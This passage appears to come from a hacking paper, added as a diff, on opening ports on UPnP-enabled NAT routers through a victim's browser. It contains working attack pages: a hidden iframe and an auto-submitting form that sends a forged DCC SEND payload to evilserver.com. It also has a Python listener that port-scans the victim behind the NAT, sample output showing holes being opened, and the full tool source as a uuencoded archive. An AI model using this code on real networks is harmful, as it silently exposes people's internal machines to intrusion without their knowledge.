+		function MyAddress(i) {ip = defunct(i); opennextport();}
+		function settitle() {
+			try{ document.title = window.frames['goodframe'].document.title;} 
+			catch(err) {return;}
+			window.setTimeout('settitle()', 350);
+		}
+		function defunct(sip) {
+			if(sip == null) return 0;
+			sip += '';  // ;( make sure it's a string
+
+			var dip = 0;
+			var a = sip.split(&quot;.&quot;);
+			var l = a.length;
+			for(var i=0; i&lt;l; i++) 
+				dip += a[l-i-1]*Math.pow(256,i);
+			return dip;
+		}
+		function formposting() {
+			window.setTimeout('opennextport()', 1000)
+		}
+		function opennextport() {
+			if(!ports || cp &lt; 0 || cp &gt; ports.length) return;
+			port = ports[cp++];
+			document.getElementById('evilframe').src = 'evilform.html'; 
+		}
+	--&gt;
+	&lt;/script&gt;
+	&lt;/head&gt;
+	&lt;body onload=&quot;settitle()&quot; style=&quot;padding: 0px; border:none; margin:0px;&quot;&gt;
+	&lt;iframe name=&quot;evilframe&quot; id=&quot;evilframe&quot; src=&quot;&quot; 
+	        width=&quot;0&quot; height=&quot;0&quot; frameborder=&quot;0&quot;&gt;&lt;/iframe&gt;
+	&lt;iframe name=&quot;goodframe&quot; id=&quot;goodframe&quot; src=&quot;http://google.com&quot; 
+	        width=&quot;100%&quot; height=&quot;100%&quot; frameborder=&quot;0&quot;&gt;&lt;/iframe&gt;
+	&lt;/body&gt;
+	&lt;/html&gt;
+
+evilform.html:
+
+	&lt;html&gt;
+	&lt;head&gt;
+	&lt;title&gt;(Untitled)&lt;/title&gt;
+	&lt;/head&gt;
+	&lt;script&gt;
+	&lt;!--
+		function doevil(ip, port) {
+			var frm = document.forms['evilform'];
+			if(ip == null || port == null || frm == null) return;
+			frm.internal_ip.value = 'internal_ip:'+ip;
+			frm.internal_port.value = 'internal_port:'+port;
+			frm.payload.value = unescape(&quot;%01&quot;)
+				+ &quot;DCC SEND evil.txt &quot; + ip + &quot; &quot; + port + 
+				+ unescape(&quot;%01%0a%0d&quot;);;
+			window.parent.formposting();
+			try { frm.submit(); } catch(err) { return; }
+		}
+	--&gt;
+	&lt;/script&gt;
+	&lt;body onload=&quot;doevil(window.parent.ip, window.parent.port)&quot;&gt;
+	&lt;form 	
+		id=&quot;evilform&quot; 
+		name=&quot;evilform&quot; 
+		action=&quot;http://evilserver.com:6667/&quot;
+		method=&quot;post&quot; 
+		enctype=&quot;multipart/form-data&quot;
+	&gt;
+	&lt;input type=&quot;input&quot; id=&quot;internal_ip&quot; name=&quot;internal_ip&quot; value=&quot;null&quot;&gt;
+	&lt;input type=&quot;input&quot; id=&quot;internal_port&quot; name=&quot;internal_port&quot; value=&quot;null&quot;&gt;
+	&lt;input type=&quot;input&quot; id=&quot;payload&quot; name=&quot;payload&quot; value=&quot;null&quot;&gt;
+	&lt;/form&gt;
+	&lt;/body&gt;
+	&lt;/html&gt;
+
+Voila.  Now you have a couple of pages that can be used 
+to open ports for connecting to boxes that are NAT'd 
+behind UPnP enabled routers. The section below details the 
+final component of our implementation: the listener. 
+
+--[ 2.4 - Implementation specifics: Listener
+
+Possibly the most trivial component of our implementation is
+the listener. This service will sit on evilserver.com and 
+listen on the port of choice (6667 for IRC/DCC and our code
+above).
+
+When the victim browses to evil.html and inadvertantly posts
+via evilform.html, the listener is responsible for receiving 
+the connection. This can trivially be implemented in python 
+using the &quot;SocketServer&quot; module. A small example of this is 
+as follows:
+
+class RequestHandler(SocketServer.StreamRequestHandler):
+	def handle(self):
+		while(True):
+			try:
+				line = self.rfile.readline()
+			except:
+				return
+			...
+
+# begin listening for new connections.
+tcpserver = SocketServer.TCPServer(('localhost', port),RequestHandler)
+tcpserver.serve_forever()
+
+The implementation of the listener provided with this paper will also 
+attempt to connect back to the victim through their gateway, effectively 
+port scanning the victim, behind the NAT.
+
+Here is the code to do this:
+
+	def scan(self, ip, port):
+		sock = socket.socket()
+		sock.settimeout(1)
+
+		ret = sock.connect_ex((ip,int(port))) == 0
+		sock.close()
+		return ret
+
+The code for the listener (whiskers.py) can be generated with the script
+that is included in section Appendix A.
+
+The output of whiskers is as follows:
+
+-[max@evilserver:~]$ python whiskers.py
+
+***********************************************************
+Sat, 12 Apr 2008 01:13:17 GMT: Starting server....
+Sat, 12 Apr 2008 01:13:17 GMT: Server started: 1.2.3.1337 listening on 6667
+Sat, 12 Apr 2008 01:13:39 GMT: [+] Opened hole for port: 135 on ip: 1.2.3.4
+Sat, 12 Apr 2008 01:13:39 GMT: [+] ---- Internal port: 135 on ip: 
+                               192.168.0.100 - closed.
+Sat, 12 Apr 2008 01:13:40 GMT: [+] Opened hole for port: 137 on ip: 1.2.3.4
+Sat, 12 Apr 2008 01:13:40 GMT: [+] ---- Internal port: 137 on ip: 
+                               192.168.0.100 - closed.
+Sat, 12 Apr 2008 01:13:42 GMT: [+] Opened hole for port: 138 on ip: 1.2.3.4
+Sat, 12 Apr 2008 01:13:42 GMT: [+] ---- Internal port: 138 on ip: 
+                               192.168.0.100 - closed.
+Sat, 12 Apr 2008 01:13:43 GMT: [+] Opened hole for port: 139 on ip: 1.2.3.4
+Sat, 12 Apr 2008 01:13:44 GMT: [+] ---- Internal port: 139 on ip: 
+                               192.168.0.100 - closed.
+Sat, 12 Apr 2008 01:13:45 GMT: [+] Opened hole for port: 22 on ip: 1.2.3.4
+Sat, 12 Apr 2008 01:13:45 GMT: [+] ---- Internal port: 22 on ip: 
+                               192.168.0.100 - open.
+Sat, 12 Apr 2008 01:13:53 GMT: Server stopped.
+
+As you can see, the victim had a service running on port 22.
+
+--[ 3 - Putting it all together with Python.
+
+Since it's a bit cumbersome to remember which bit to swivel where and when 
+or what protocol's to use and how, we've provided an extensible python 
+script that generates the two webpages (with the options to name them 
+something a little more innocuous), MyAddress.class,  and a listener based 
+on specified parameters.  
+
+Type ./claw.py -h for usage.
+
+--[ 4 - References
+
+[1] Network Address Translation :: http://www.faqs.org/rfcs/rfc1631.html
+[2] UPnP NAT Traversal
+[3] Khaled would be proud       :: http://www.mirc.co.uk/help/rfc1459.txt
+[4] MyAddress Java Applet       
+                             :: http://reglos.de/myaddress/MyAddress.html
+[5] Defunct IP address representation
+http://www.mirrors.wiretapped.net/security/info/textfiles/keen-veracity/ ..
+  kv6.txt
+
+--[ 5 - Appendix A: Source code 
+
+The source code used in this paper was written by arachne.
+We really appreciate her work on this project.
+
+begin 644 claw.tgz
+M'XL(`,`+`$@``]1:_U?;QK+OK]9?L18AEH(M!`D),3B!``FT@%5P&lt;I,2ZB/;
+M`NM&amp;EO0D&amp;?#M[?_^/C.[DB7CM'WWG9[SGD^(5J/9V=GYOB,-`_?&gt;BF&lt;__)T_
+M&amp;[]7MBVO+[&lt;J5]O&gt;VMAX\?*'C0UY\_+%BQ_LC&gt;&lt;O[,T?A/VW&lt;J5^TS1S$R%^
+M&lt;!-W.`Z][^+]V7.Y&amp;;NX_C_YK=37IVFR/O##]7B6C:-0TW5=:Q_RQ9_$49*)
+M=);FPULOB^*L&gt;.`%WG!^%PV_&gt;&lt;7==)J/+K/$#V]/NIKVZ&gt;CB\J1[+CI&quot;MRW;
+MVM&quot;UPZ/WE[C]3;^/;OS`T]OZ_=A/OWE)&quot;J/4FT*?N`/UX&amp;RV/QHE7II:P\!-
+M4_UW[?*X&gt;]'K.CVBH-^-C]MQVVE'[4%;UTZ[YQ_R)V,OB'7M;/]S'^N_ZUZ&gt;
+M]+X`_!QKO_OX`:/W;I!ZVIV7#*+4SV:`V)J7)/UHFF&amp;,S5MI-@)`&amp;WF#Z&gt;UC
+M\&quot;1=`ARYF?L8&quot;A(W8IJZMYZ!61U=-]M:33_TTSAP9ZG(QIY\*OSP)DHF;N9'
+MH&lt;&quot;(GV#;]\*-X\`?\@-+B`,W%`-/W/G&gt;O3&lt;2]WXV9LS66*2X&amp;8YUK&lt;9,&amp;SI?
+M1!3JIE;S;P16%W7(1L?Z-7!F$)-N&lt;GMW95^+-:&amp;WA8X+L(`&gt;0WV9&gt;/.FM!$H
+M1B?E71Y&lt;G#@]J+2M7=VMIM=:#]H3&lt;1+=)NX$QA)ZB9MYV-A]).!GF3\4Q[VS
+M4Q%CCZDPO#L_L,;9)-&quot;&gt;&quot;AK3GOE&gt;#&amp;8&quot;HG*G068*;,G-Q%!N=9IBHUDDHM@+
+MQ2V(W[LSH8VC`/3N?%=\=$('@NE!&quot;HJ`F'C#L1OZZ80E.8I@C&quot;`)/O$/E&amp;&quot;F
+M`]`$^9.+`W%X&lt;&quot;`NC\X/1&gt;&quot;'I`;ATJR)B*,TLS3M\.3RX'3_Y.SHHBWW.HQ&amp;
+M'A%RN@&lt;@P63&lt;+/,F&lt;4:T1]XD&quot;M.,A,&quot;*&amp;;BI/]1(H$,_)I8C,@=B:.J&lt;.S2#
+M/&quot;:EO;IB$#U@QV.?J(KS_1Z6_WBY_^&amp;HK:VFX@IN&quot;!M(K\75A!P$5Y&gt;OFE9C
+M0*U6HQ5I2$)+4IA'`,$FT7WJT4KXYX=^YN&gt;\P1!J-?#N#K]!@(=2&gt;&quot;RA0DT&quot;
+MEC,-T]@;^C&gt;^-[*TFJN6(H:G#W[@N\E,KLE*(ZE)LX[=61&quot;YHQVY3.@-A_!D
+M0AY-F9O#[AFHPVJ`ZB43/TUI=V&quot;$\1&gt;YF1O*(D=:E^WQ$G;=&amp;D#&gt;?M8G8ZO5
+MR&quot;)&lt;&amp;4!(ZI*G6\6G%`U,1GHBS(&amp;7O1_#R`@SMV3XF#?@:5!Y@;R,2VC-&gt;_B.
+MT%IC(*?CZ%Z:(&lt;4G`%MTI0&gt;0`6Z/Q7`,Z=5JQ_A?&lt;LGF%D)VF?0!.$F5.&gt;;B
+M1_?.O1PF/BR0^?=YHO?@#:&lt;9\UIF$UY,&lt;QZSJ&quot;RQGT5]&lt;K6:BZ4G$[&gt;5&gt;K$K
+M%PM\\`5),IYDL#&quot;C.4M_RLTCR1$1IKWQ?*N)_U[1?]OTW^NF&gt;&quot;HV-XF]6`QI
+MW5K-H0SS=TF'9[Q\^?*5A6'+H&lt;&quot;61&lt;,HJ-6Z&quot;`[139O&quot;Q&lt;(&lt;@O&quot;\ME-$&amp;1?!
+M;SI`@A2S:,J1#)8H(K&quot;7R#5RPBD9&quot;W`:)-YO'NWTCM03#A//A=L626J'?%I,
+MHL3CH$8#33OZO'_FG,KX`/LA1QE%$]&lt;/+&gt;A.0&amp;8;SY^_$M@'!3EH&amp;`(6&lt;)+)
+MC-Q$QF&amp;$=;$J#)6HFZ*4%BHW2`MTYSWXF;%ARKR&amp;39!3]X&amp;2&amp;BYR!(!IAS(\
+M9SE'/O9D/`#2=.*%D%F*_W.]+Z:XIDB\;)J$%&quot;%=.-R0+&lt;Z%LZK%H%:RQXF7
+M4&lt;D`8\Z2&amp;:4T1,&gt;T28ND2,&quot;R:+'DA3DK*H&gt;FR&quot;L%[,A[&amp;'IQ7N-8'_ARE&quot;01
+M)N`1D96I&amp;S&lt;6IT9.I8$7&amp;K20*=Z(S3F2WHLB,7'#67FKN8=1%EZ)QDU6GBO`
+M?$BQ$)X&amp;4XT2&quot;[]'M.UVC7\K@E0J4%O$*&quot;\HUN[,TQED&amp;(4JJ,&amp;.$K!#6KAJ
+M3+B^:EQ#'$00*F12=Q&quot;I/UG,#1`%2J+VLLF-(ADTA&quot;`*HV6)@C8`6YTA#,(G
+MT]@?3J-IJM4&gt;;6ICOHB[P.'&amp;M6)#+$-I5-)``XQP_@G&lt;))A593-R)R&amp;E%ZTV
+M_ZW`?OR[M`X-D@:BIDNIGHR&amp;^`&amp;/%,&quot;%H;?&amp;5(/*T,RU6JY=TCVX8\P.ZJC6
+M'5=2*_!Q9+`PHJ+''5#]5[BL?&quot;[(]&lt;F&lt;)Q`:U0#BKJ'$7W@Y:;&amp;8!DE.W&amp;^8
+MH::S\\2Q]'VJ.'AP'R6C&amp;2+1B&lt;QLX10U34*^0M2]_YJBQ%7S*W4P^2C5A1-*
+MQE22Y8F0LA.B%`!&gt;$(#N)9CS2APL3(M&quot;2)TS6@0\F5P3:`A*9[-,IEZ38Y\B
+M`=1I,%+^,*MNF%:5E4N&quot;)#!W'A4B&lt;BG.@X2*F4&quot;E@@V^Y*44[J%`YO)6UGN4
+M&quot;;(^'5XD@2&quot;*8@[4M#!V]UBEQZQ297J&lt;C*5Q+N+%%3Q*2\OQG#(&gt;17R%5JLM
+M($9EQ(CSZW**`XD(@&amp;O=H.(P]/5UW:1G+78LU&amp;5\`,JRN(TGJ.C=.6$*^@59
+M&amp;68Y8FL:GZ^*9$&gt;QFS+6@.I8!&amp;#YE$MI#XN2=(OTQ&gt;&gt;-&amp;]'O4V79[QLX(-XT
+M18CXW.0Z@5U(3[V\*%3S&amp;(.-.:_9&quot;7E'%OO^3167SY0P*CC9/*!2Z*_1:A:3
+MZC#%',0S.CQ1DPRJ:C2#3NELRGQ*WJAP\.3.L#9JB.$8651NVDMW5#ZJU+1&quot;
+M$E'G-&quot;I#&quot;)DY4F(-$9/5RCB)C`(O^5^NC*&quot;:L5.H2E91A4/B&quot;#\2!FQ?GN;-
+M'.,&quot;00!^&lt;:P0I1+SPY1*IG`9#IOY/G*1EW9BT%::O&quot;$S-Q0_&amp;8Z&amp;0R/'YF2O
+MDGFJ&quot;D/)G^(]&lt;6\RDE=1A3^2(LCQ80Z4EUG4'UH1MM-`?=-X9$[TA&amp;JY'?$_
+MM:L&lt;Q5JP:UZGR43-/S6L[QM.V5)0?TU##P?`&amp;!7$JKU!A4*MA@-Y&lt;2[E')L]
+M9'Q`]V,ZK/.0V5\3$KU&quot;8]5V5VV4'#MT9O\S*_P_866)SN&lt;2#N:A&amp;_25`Y^3
+M&amp;Y7`V'T!]!Z6XA;@.6X5ROC]A$)&amp;XE&amp;='*-H,/2KKP_VQC6$CL&amp;F?4V2ER-K
+M[:T&lt;&amp;%=VZ_7UVENS&lt;FNRPBJ,/R9&gt;&gt;=Q&gt;/A.&lt;?7^&gt;'Y=G:710)80&gt;TJPL4E05
+M7*MQ%Z,C.`PF5`]9*#%&amp;!#78LF3)*W&amp;E\#654&lt;@-!E$4&amp;(0LJ=;((/QP2H*E
+MG%6;@'258]0JV7`LYRA&quot;$VHTD&gt;0EC:KV8(S3$&quot;5H;$RLVR2:QCA-F-6U'BVD
+MA+ILJ&gt;4K*9.8K[!\@256\:=K5.WK^[M9-,_\^:9\?-K]8-TG?D:6MW8MNCAQ
+MPV&gt;HJ\5^PG8B5JG.@LO3B$]I%:+-,O_F(EE)MX6?.%%B64)5M`03KDBN65:Q
+M:2+&amp;&amp;/HPB.#4&gt;E.GWH!N7K%]4=O**#%1XHAS/S&lt;6+1G1&lt;F.3CJX2&quot;9W^*'GT
+MBB1*P&gt;'.'ZG,P=TSP4TBU+O?6#3J&gt;$^98[/28E2-FG1I]S&quot;&amp;FL9&quot;=@VS,31Q
+M.Z8.&amp;R&lt;=ZL19RPL9+@([YYP&quot;N=!38PIA'94-9+W6T:E[0&lt;T+ZEU0ZV)S$T&lt;)
+MJKDZC7EOJ&quot;&amp;#[@GWX0+_7XB9E6[OO))@&quot;?/ZL!Z^%D!E4GPM2AYP1&quot;4/+CE(
+M,@:@'.1@8@E`NN0@YZ+;ZQYT3ZE[?J6RNWFM4@?JYF_3F!@H98V+4M8X&lt;?)L
+M$$1#F-G$12&amp;#*.3243^CPD:^**#S.(T&amp;,\K;O,D5:FI\/'2@JJ%+8[!V'X4-
+M'`.&amp;&amp;&lt;XP.&amp;24FJNJVX-D%U!:H2-`ZE'2=S-70(KYZ&lt;(5L@LBZP,_Q.D`N9?Z
+M&quot;&quot;&amp;8I4V#&quot;PJ2DBUY,=3=_OO^R?E1KYD_O&gt;P&gt;_-0__'&quot;Q?V:JF9;B`SZVL?G&lt;
+M*OU!X=LVNZ+*:XRNMDW,&amp;&quot;;.X4JNTD^EG&lt;GS=E.XZGJOKNIEB)1YEP^Y4N;4
+M7V&gt;KI\=_W&gt;3=HH,.!.XQ-T;&lt;=I9^$#JR_,GSOLHCV$`.,@IC,^6Y&gt;8Y;BI*J
+M(7(2WL'&amp;1Z4C70NZ^Q;22;.HPF1HJY#-JZ5.0=U:++,(;&lt;YE@;98YG&quot;N!)=E
+M9RKQ6?$QOBD9&gt;W6N]+E'&lt;_.31L&amp;G/'*HES`E-S2K0%YT$&lt;9!LPHC+YV#E!3F
+M`+4LLTHE@$S2V20.J,G?X9&lt;VNQ1WWN`&quot;)\`E\[/`&gt;V-\#'DP,G?7)43;I1,V
+M_)5&gt;&lt;'0&gt;O7QC7^KHDYEJJ&gt;NPS5FJ^JK^*!MW=%L78\^_'6&lt;T?+.[+NF!L$++
+M9C$H9,@1Z_]T[UP)U?&amp;\WFIIM3LW$9Q3PVD0[,A[)=T%&quot;(6T*^I;KE$]71$R
+M)1Q=OU;(0R)G[U#/A[,TTEZQ+&lt;,WQ6_E'`[`#K]D&quot;L$@43/,G=]+,Q'*6%`&amp;
+MYDEI_X8P,V3#MO@):-TCTD?W%F&lt;LG+AOHVC$X\:U5&lt;7=^1WN2I6&amp;ER0@*,,%
+MK5=3)+!&lt;SY]XT30S&amp;O.ED6Z&gt;;]DF]E=F+=]!BG3-S/DW-&quot;9S)=&amp;9ZB1)HH#=
+MTA&amp;B(QH-'(O6U\6.`45^\T0ZI69*UI&quot;]:W(&gt;LBF2XLA78I2WU&amp;``#2N-`S\S
+M*+WG3P)J+5B!%]YF8X(AL1FLU8Z](_S=`/^MK9E\8!E))MRKH.6W-JZ?G;G9
+M&amp;+YS;VQNO6SZ3#%O4/CQPFZI!TBOF=B_&gt;;M+1%95),1&amp;7QN854)5G%QP=6EB
+M__XWF&lt;^NL-7HC30]M;U&lt;I,1HJ=F07@WCM34ROUJA;@3/H\&quot;CX;O9R&lt;B0;4RV
+M&quot;=-*DR%U-J4MR]@O+;A!K\U^UUHM&gt;,&gt;Z=!0:*1&lt;&gt;1*,9=&gt;`0&quot;CKZW#AT*&amp;X6
+MP,5BV7%L&quot;SM^V$%X3T9&gt;TJ83_`YTG=SZ89L&gt;D.&gt;I%W#2MPO.=.&amp;/*K?@LP,&gt;
+ME_FYK,[D&amp;LKO)=%%ZH4O2.JE6Z+^55]P:`Y\4AC%PM#AZGQM&gt;?&lt;'RZ^3G%AL
+M'`!EY5ES_\/HF`N_T`9'K;D/1B0O@XI@#N-L3F3]-PD=-0IS(.M%9,B;V0TV
+M%IC=W%W)X/)LD]\SD:HWLX&lt;E$ZM4JUM(MU/:6*-\&lt;&amp;RLL0M5D6F!)&gt;A\0FBL
+M&lt;3-.35$YIT&quot;6&gt;LI3-&quot;MH9^Z#L9ODNRQ\=$&gt;&amp;2_$;;&lt;-*IX.)3\%55$-@OBWQ
+M^Q++KUB\$G5U11)\%&lt;)J(&quot;/GU_GT)B(W:MSK\*^2U2N(R[KL%/W3JDG*G,T?
+M2U3A4N$LBG78F.R6P`V!3E0]F`BG/OD&amp;P$VR=5JP166KKI&amp;?&lt;']$XO!8NDA)
+MB7GZK8!8(QV=C$+_&quot;U2(RT=T)/&quot;O45(ZSVD4MPNS&gt;7/?=;_[N?MQT^?QYTCY
+M5T11\0U2AJB&gt;CY-B=,GU^:67W'G)\B^2Z#,F?E$Y/Z8C0Z)ZXXP&amp;&amp;=!MT0K7
+M5T=6_H\/Q5_YW&quot;KDSR`/?2KLAYL;^;V721_(;+XPFV(YGFU+3,;;&gt;/D'&gt;!*3
+M\;;_$(T0&lt;1YG!/7&lt;U%:$)_N&gt;&lt;H=YC_8TNFTO/=)2DI']&gt;0\&amp;W&gt;%OH?A\P;9\
+M$T(R.4H!',_[:PR@F=0_P:7`2?DS*G5'[YPN3WXY`FS#?K&amp;]]&gt;JEEC,S\H)R
+M5S&lt;OL&amp;_&quot;&gt;57-3.2]O_SYN/1\;'$_0G:T%EC,UZ'LOGPA;A17V:R#]VH?;6'=
+MI2N7EJ;5#$6_*717_TZS37U[-F^OYR14D\DL^/?3Q1WD9\KJC&amp;(&quot;GR&lt;+-5-P
+MR?=-G3V#`%:_S];1[V-$&amp;N[W^:,PA#*=#]!$NK2T60+F(-D9G+&lt;.^&gt;P4T7=B
+M;I9+0)T-Z6T&gt;B1I'[*R?^O_R4$]5Y%Y1J3P/\UD&gt;H?1KJ)&gt;U:]T$TW3,8N?W
+M8849MH7\6DTO=$G]E&quot;&quot;ZE1\E)9X[''NC'=DC($'`,6ZYS5^R&quot;2:D\6&lt;91(MP
+MJ4DE&amp;_P#T/@VUX(21RYM,/KL/__IYI)FP+-&quot;=\QTA^,?1)C&lt;T,#05]VF6!V)
+MU8%8_2)6/XL/9SV]*9%N)XQBFO-/^G2A6_^,_-&quot;XXHPU'.,$;K*0&gt;,AO3;',
+MM?EX;\Q''E&quot;JG7ZC''VMRPPRFE0Q3!5^N$DH-U841^WO]6&quot;*%@M7M;*6W^#3
+M+0Q.8&gt;?ME[[W0-&amp;Q27&amp;&lt;J9K\(M0NNC2%H^8O&amp;;RLT*H\..=:E8D^[R=P(N&lt;V
+M1(K\X9-O*5\!^4:_3ZVE?K^!363#.&amp;4)%/%*Q8\\C*C60N.[E01*?;8[&gt;898
+M1&quot;L5%IKL[@()!FSHU.C-'C+HG=\!J*&gt;6,M;B7K68+S,4'=0QE=S2QQK2N\H;
+MJ&amp;BT=^#(D6$0KTIOS045+RXC2='WU9DWXOXR?=?E\2MCU,BKOL6)M42QRH7%
+MESZ,TZ.EV=OE)SK*3+S*QSGDO_1ICOJ^A=3S&gt;KN]T`@O$#:N94SF+TP2UT^]
+M.?F?O-D@&lt;I,1M\J3J8K9;`&quot;U&amp;S^D1J2*I7.)E5\++.P@Z9&gt;RQ#(!17%,,&lt;C4
+MY!NZ6JWH2[P+HH&amp;JC08&gt;CFKTLE$L-&amp;.TLXON+[]T]\2*T'OU%6=/O-O#'ZXG
+MN/XH\&amp;?C#_&lt;_8?P3QC]A?(KQ*9YK9V&gt;`G&amp;%T!N@YH.&lt;8=W'M`N[@ZN#Z,YY=
+M8'R!ZR6&gt;]S#NV33[(T8?`?DD]NHKB.@_.[OBRL;?'OXP_@K85]Q_Q?U7W%_C
+M_AKWU[C7SJX!^1607P'Y%9!?G=VZ&lt;(Z%`7GJQ/SJYV=&quot;=\0KP-;L^IYNB[?B
+MZ1-3U+]B]O;&gt;H6@X]0,)M1GZVF;8&gt;PG;?4:PMF#8B80=J]EMAZ&amp;G$MICZ,X&gt;
+MUG;J7:Q](!H&quot;:Q^+7?M8/-NK7P#OG6@T`:/9'7$L,.4C,$]$8QM06W0DYY]U
+M$F3C$#`AWNPQYU&lt;ZB;_A`':*V6]!&lt;TW4?P5T3S2^`DH2!&lt;S1ZX&quot;=H=)CBGO.
+MJ3!L_0GC&amp;2^8'^UL'S2?V7J#US;V3*$;XIWMB!-'?PXC^`&quot;^D3=VQ;&amp;$'0+V
+MHVC:@'W&amp;;,=QQ*F]\@30*]%L-L7:9_$S--UU&quot;+;R5+1VFZ)Y+$XP^Y+Q5BR&gt;
+MW:1]$V9OCZ'/&amp;=IZP;,_V?IKP-K&quot;/`;L5'P@F*._!6R75VGU,/L8:_]C3W\'
+MZ%MA]IK&quot;$N((F)]MO078.V%\!JPI#K'V%Z&amp;O`W:$TANP;&lt;P^P.POCFX#&quot;N$3
+MYB'4Y(A?]O2M%?'DB3&quot;-IK&quot;WQ=&amp;&gt;4Z_SOI\8+`O[6,ZNZP[1?-(2YBF@GX7C
+M/$'9C+]-41?8]+,7AW51[^'Z\X_;KU[OKWU:=7:?_GP$?&gt;O7]=U&amp;_?3UJXV5
+MG4]?&gt;J]?[?&lt;LS%[5]TZ&gt;/SW9[[Q_TMUYNGK^^N)Z??O]R='V/^PK88L7S_2C
+M)FSM_&gt;JG[&lt;WKT^V77SZL?6SU=M\?G;^^/,5:&gt;Z6UOAQA%7/G_5;/?KEQN/M^
+MZW(7.-H9&gt;%O$VGIQZ!#]-M%7U,]?O[*[6UMFT_YT?0XJ!YVG1UWMO]NYTN&gt;T
+ME23^G;]B1A&lt;2I]`!B&quot;.1,,(8@PU8@!V;I))]WGVIVDVRR4NE]K_?7\](`GR\
+M&gt;M^V:DM392.DZ9F^&gt;T;T]*)_-I&gt;T^5U\#J:.%UN.$[&lt;!G52T4SH/5-KWF/&amp;J
+MM`&quot;]-UT\#9R]Z#G8UM&gt;]#D^JR87K;JU9T*X+/FCK*,,C&amp;N[L:^`PQ]P[\U[,
+MR[O3C$O=SA#0PW6WPZ&gt;]=OVFL1:XO#G&quot;90&lt;\B.&lt;3_PI7]?[.OPD\?QNT[Y*T
+M=_2T]VG?U45I,=BU8G!AG4*&lt;_SG$YIJXU1^O+@@.F!\@)P?(5=2?#*YSNM&lt;Y
+M[T\D&quot;ZZ1;)7E]#7-.$A3CNCM6NL&gt;1K#/_0F@:6[2+2&lt;Z'3_9CWHD5W5^T0ZA
+M[J/HV?R@6^K64ZUTAV7K`G.1ULR?4I3-7UJ\1E.06)M@$L0#TB;N/:5,C$Y&lt;
+M&amp;SR3]]/Y4]WK/,6AM,BP:&quot;2Q)491QZ^.TDZ&gt;0K\JE0/7()/:8438677C.ZZZ
+M&gt;-U&quot;+_Q0R*'WFL1(3J6%&gt;F-NZL[MNNYZ5[4S;U,]PW=;8_QL!6SCI(E1^%A7
+M?2UNNG2MZ;ZO/&lt;`&gt;`]AW=]&gt;ZZ&amp;]O\2U2;,\.R89-&gt;&quot;6&gt;6&amp;4[V=?&lt;C8EGON)J
+MNNHLQ?USLB]8%WD'UE)M;P5_QG0[65EV0O;&gt;4KOMU1SW?'NKPQOL$U-;7?&gt;W
+MB\U`X4G/B&amp;],+;8!;3,-8XT#8*MZ]&gt;O^&gt;3T!#Q)_HL^';8_FU&gt;$PFAZP5L&gt;^
+MXXWWCJG5H[ZQDO(.,8+;\BT'6(8NYNFU@SOBC*F#MZ!&quot;\S*H_1(63-(3%(JY
+M*ZU.=!;`G_3:^ZL!:%.\H.F-+:NEM73!J23(:46L*/&gt;WD,N:0\_[:_A%KIO=
+M3BWL3ORX/^*-/C@93.(X()\^CI&gt;8074ZG'C3=&amp;0_,3^T9&lt;?).XSQQ'&quot;U?=/9
+M^#;U&lt;@V,[]UM^FTK'L2MJ#M9Q;AO'WNOTJ*:@%/&amp;7EBI-GY=,]3QZAK&gt;&lt;PYN
+MXIX^ZAO^C:#;&lt;(W]=6_G$X:6VXEY8+360:=^PVRN'W\WM&lt;PSLU7UK`;,&gt;Z&quot;C
+M=6[%06&lt;8#29&gt;&amp;)Q;UWV'[X:[P15BQCGPNJE.6K%9J\`'Z.O!FE&gt;!SSCH6`OH
+M6OON&quot;G,VCN&gt;H3@1MI#7U-UY,?##=\9[;FY;E)J27%RZ\Y!K06]_HM05'--`9
+M#4E+8VA,I[4AZ?%-&gt;GU#\33P;-\JMWR;1O9*BY8?&gt;42[#ZR&quot;K9_0*+[AW](H
+M;&quot;.U!9_KOOB,=8^BLS\ENW@+[[!IZ=!SSR&amp;=,O1QH,%G=^HQ)'8S-'Q$/V@(
+M#R)0]&lt;RG'Z(!S8_(0YI(LM&lt;AWZB[%19SEEI,)2A;T3#S`&lt;*^^&lt;1?#=OZ7&amp;BH
+M$5Q`^QWR-:091(F-$2';A&quot;+O,*5(F0SCH5:G&quot;'R.N&lt;^)&quot;_MSQ%.MOZU#OQ!]
+M-`OQE&amp;QL2/?-_DZ,V*`1'4AQJ.EC1(,R-'%70Z]%WLN=Z`MAL5N:0^I8OF8@
+MO3-P7^&lt;110.=8G@\(%O:BKO7`X%+3*-U2#/ZNP'1+SP5YE=Z';(L:P9YO[PV
+MP-/XE77#874D]+SQ=$T@[!AC'T5B0&amp;R6@)(\XKIX!AN33\N@8`E_=49TE8_7
+M$%NY(J@FS_4`&lt;RO67X[VJ5ZX60P05H*XX=]&quot;WY&gt;B)[AG;$\C$&gt;2_@88D;[S3
+M?J6%]G+,(NU\-&gt;H'$@&lt;OCT1B-&gt;&gt;TL=J#%AQT8'^\&quot;G2A29=&quot;'FR5&lt;RU?'Q[-
+ME]U;D72N2'/)WV*^6K^]WPRVOMH'AS'W5GC$[*X&amp;WI\'I_=TTN:!])S5[-X;
+M(X:\@S9A&lt;K'(&gt;3PY@;2%=LK1ZND]6-$J[D)Z@&amp;8D7V!:KI_!0N.JX+=^T]U9
+M%X,R&gt;!'7L_439KF['D#6V4H7:\64^[S#(_&quot;4]-@&lt;;(5%IK%C==,S]KN6L3\;
+MMC&gt;I/5Z(&gt;V+E$0W+_@UY!&amp;A$)&quot;TD2OI'7D#9M:Y]\AP=2R6,T;&lt;\;-]=4A3&lt;
+M[\3&lt;NR#JE_W8W=)*V]]!:Y,`:U7:69J,WKUYS`I9G5[5)]AMT2?%;^4*.R3Y
+M!K\ZQYY$7JY&quot;M2.O5!\[+7E9F6*W)1OMP@B:FO(^[U%]R'O&lt;I'/@^2I_7KO-
+MGY&lt;6M+\3,\#JY9X/EE\E7-0N`X$\Q&amp;79=LKCV]DBY'7\-1JA;7MJ5R\M*I==
+MYO:[S%M6WC*VS'JX];!]CRD#P[9]WL?V#_T\]'.39*Z%C2W3)CW:U=3F[FR`
+M'=[`T;1WY_&quot;&quot;'2U&lt;-0PX9O-RSJI0&gt;\X]?;%D:XS:PI\M^OL#&gt;&quot;8MO-HP=0VH
+MVF+.Z-T'7+'-(::0]N6&lt;:7-F+;G+#`_[?VQ'H5U+HD:EO:!*5]B)8_,H_E4I
+MYBFW@&amp;371'J-1L`^OP4Q,&quot;W$OIQ7F6HR%UMB8&amp;Z0$#EZUAC6/QL:^QWVWO0Y
+M)^D-EA3^L/MGO*=,':,*^N==+$6FA'DTVC*]`NR3F18YN*X:6%'/*I'I@48'
